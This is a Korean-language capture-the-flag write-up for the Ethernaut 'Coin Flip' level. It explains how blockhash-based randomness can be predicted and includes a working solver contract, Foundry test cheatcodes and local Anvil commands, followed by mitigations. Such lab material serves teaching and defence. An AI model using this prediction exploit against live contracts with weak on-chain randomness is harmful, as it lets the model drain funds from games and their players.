# 03. Coin Flip

[English](../en/03_CoinFlip.md) | [한국어](03_CoinFlip.md)

## 문제 목표

코인 플립의 결과를 연속으로 10번 맞힙니다.

## 핵심 개념

- 예측 가능한 온체인 난수
- 공개된 블록 메타데이터
- `blockhash(block.number - 1)`
- 결정론적 계산
- 블록당 하나의 예측 트랜잭션
- Foundry의 `vm.roll()`과 `vm.setBlockhash()` cheatcode
- 로컬 Anvil의 실제 블록 진행

## 컨트랙트 분석

### 결정론적인 코인 플립

대상 컨트랙트는 이전 블록 해시로 결과를 계산합니다.

```solidity
uint256 blockValue = uint256(blockhash(block.number - 1));
uint256 coinFlip = blockValue / FACTOR;
bool side = coinFlip == 1 ? true : false;
```

`blockhash(block.number - 1)`은 바로 이전 블록의 해시를 조회합니다. 새로운 해시를 생성하는 함수가 아닙니다.

`FACTOR`는 `2^255`입니다. 블록 해시는 256비트 값이므로 이를 `2^255`로 나누면 결과는 `0` 또는 `1`이 됩니다. 컨트랙트는 이 값을 각각 `false` 또는 `true`로 변환합니다.

이 계산은 결정론적입니다. 같은 이전 블록 해시를 사용하면 항상 같은 면이 나옵니다.

### 결과를 예측할 수 있는 이유

이전 블록 해시는 공개된 값입니다. 솔버 컨트랙트는 `flip()`을 호출하기 전에 이 값을 읽고 대상 컨트랙트의 계산을 그대로 반복할 수 있습니다.

솔버의 계산과 대상 함수 호출은 같은 트랜잭션에서 실행되므로 현재 블록 번호와 이전 블록 해시도 동일합니다.

```text
솔버가 이전 블록 해시 조회
        ↓
예상되는 면 계산
        ↓
CoinFlip.flip(predictedSide) 호출
        ↓
CoinFlip이 같은 이전 블록 해시 조회
        ↓
같은 계산으로 같은 면 도출
        ↓
예측 성공
```

### 블록마다 한 번만 제출해야 하는 이유

대상 컨트랙트는 마지막으로 사용한 블록 해시 값을 저장합니다.

```solidity
if (lastHash == blockValue) {
    revert();
}

lastHash = blockValue;
```

같은 블록에서 `flip()`을 두 번 호출하면 동일한 이전 블록 해시를 다시 사용하므로 두 번째 호출이 revert됩니다. 따라서 서로 다른 10개의 블록에서 예측을 한 번씩 제출해야 합니다.

이 검사는 호출 빈도를 제한할 뿐 결과를 예측하지 못하게 만들지는 않습니다.

## 솔버 컨트랙트

```solidity
constructor(address targetAddress) {
    target = ICoinFlip(targetAddress);
}

function solve() external {
    uint256 previousBlockHashValue =
        uint256(blockhash(block.number - 1));

    uint256 predictedOutcome =
        previousBlockHashValue / FACTOR;

    bool predictedSide = predictedOutcome == 1;

    target.flip(predictedSide);
}
```

`CoinFlipSolver`를 배포할 때 대상 주소를 고정합니다. 이후 `solve()`를 호출할 때마다 대상 컨트랙트가 사용할 공개된 값을 똑같이 읽고 예상 결과를 제출합니다. 솔버가 블록 해시를 제어하는 것은 아닙니다.

## Foundry 테스트 환경

### `vm.roll()`

```solidity
vm.roll(block.number + 1);
```

현재 블록 번호를 변경하여 각 예측이 새로운 블록에서 실행되는 상황을 표현합니다. 건너뛴 블록을 실제로 생성하거나 해당 블록의 해시를 자동으로 만들지는 않습니다.

### `vm.setBlockhash()`

```solidity
uint256 previousBlockNumber = block.number - 1;
bytes32 simulatedPreviousBlockHash =
    keccak256(abi.encodePacked(block.number, round));

vm.setBlockhash(
    previousBlockNumber,
    simulatedPreviousBlockHash
);
```

`vm.setBlockhash(blockNumber, hash)`는 Foundry에게 `blockhash(blockNumber)`가 어떤 값을 반환해야 하는지 설정합니다.

여기서 `keccak256` 표현식은 Ethereum의 실제 블록 해시 생성 공식이 아니며 솔버 로직의 일부도 아닙니다. 반복마다 서로 다른 이전 블록을 표현하기 위한 32바이트 값을 만들 뿐입니다. 어떤 블록 해시가 주어져도 솔버가 두 가지 결과를 모두 예측할 수 있으므로 서로 다른 값이기만 하면 됩니다.

실제 체인에서는 네트워크가 블록 해시를 자동으로 생성합니다. 플레이어는 cheatcode 대신 새로운 블록마다 솔버 트랜잭션을 한 번씩 제출합니다.

## 테스트 흐름

```text
다음 테스트 블록으로 이동
        ↓
이전 블록의 테스트용 해시 설정
        ↓
솔버가 해당 해시로 결과 예측
        ↓
대상이 같은 해시로 결과 계산
        ↓
consecutiveWins 증가 확인
        ↓
10회 성공할 때까지 반복
```

## 로컬 Anvil 재현

단위 테스트는 계산을 빠르게 검증하기 위해 cheatcode로 부족한 블록 기록을 제공합니다. 선택적인 Anvil 실행은 실제 로컬 블록을 만들고 각 예측을 별도 트랜잭션으로 제출하여 이 과정을 보완합니다.

첫 번째 터미널에서 새로운 로컬 노드를 실행합니다.

```bash
make anvil
```

두 번째 터미널에서 `CoinFlip`과 `CoinFlipSolver`를 배포합니다.

```bash
make coinflip-deploy
```

예측을 10회 제출하고 결과를 확인합니다.

```bash
make coinflip-solve
make coinflip-status
```

한 라운드씩 관찰하려면 다음 명령을 사용합니다.

```bash
make coinflip-step
make coinflip-status
```

Makefile은 각 예측 전에 비어 있는 로컬 블록을 하나 생성합니다. 그러면 Forge의 사전 시뮬레이션과 실제 로컬 트랜잭션 모두에서 새로운 이전 블록 해시를 읽을 수 있습니다. 이 과정에서 솔버는 자동으로 생성된 블록 해시를 조회할 뿐, cheatcode로 값을 설정하지 않습니다.

이 실행 환경은 `127.0.0.1:8545`, 체인 ID `31337`, Anvil의 공개된 첫 번째 개발 계정으로 제한됩니다. 해당 키는 로컬 개발용으로 널리 알려진 테스트 값이므로 실제 자금을 보관하거나 공개 네트워크에서 사용하면 안 됩니다. 로컬 배포 주소는 Git에서 제외되는 `.anvil/coinflip.env`에 저장됩니다.

## 취약점의 근본 원인

컨트랙트가 공개되고 결정론적인 블록 메타데이터를 비밀 난수처럼 사용했습니다. `lastHash` 검사는 같은 블록에서의 반복 호출만 막을 뿐, 다른 컨트랙트가 계산을 그대로 재현하는 것은 막지 못합니다.

블록 해시, timestamp, 블록 번호, `prevrandao` 같은 온체인 값은 비밀이라고 가정하면 안 됩니다. 일부 블록 값에는 블록 생성자가 영향을 줄 가능성도 있습니다.

## 권장 완화 방법

- 필요한 경우 Chainlink VRF 같은 검증 가능한 난수 서비스를 사용합니다.
- 시간과 참여 방식의 trade-off를 고려해 commit-reveal 방식을 검토합니다.
- 보안에 중요한 난수를 공개 블록 메타데이터만으로 만들지 않습니다.
- 블록 생성자의 영향과 트랜잭션 순서 조작 가능성을 고려합니다.
- 난수 로직을 검토할 때 예측 가능성과 조작 가능성을 모두 테스트합니다.

## 테스트 실행

```bash
forge test --match-path test/03_CoinFlip.t.sol -vvv
```

전체 호출 추적을 확인하려면:

```bash
forge test --match-path test/03_CoinFlip.t.sol -vvvv
```

## 학습 정리

공개된 데이터를 해싱하거나 변형한다고 해서 예측할 수 없는 값이 되지는 않습니다. 다른 컨트랙트가 같은 입력을 읽고 추측을 제출하기 전에 계산을 재현할 수 있다면 결과도 예측할 수 있습니다.
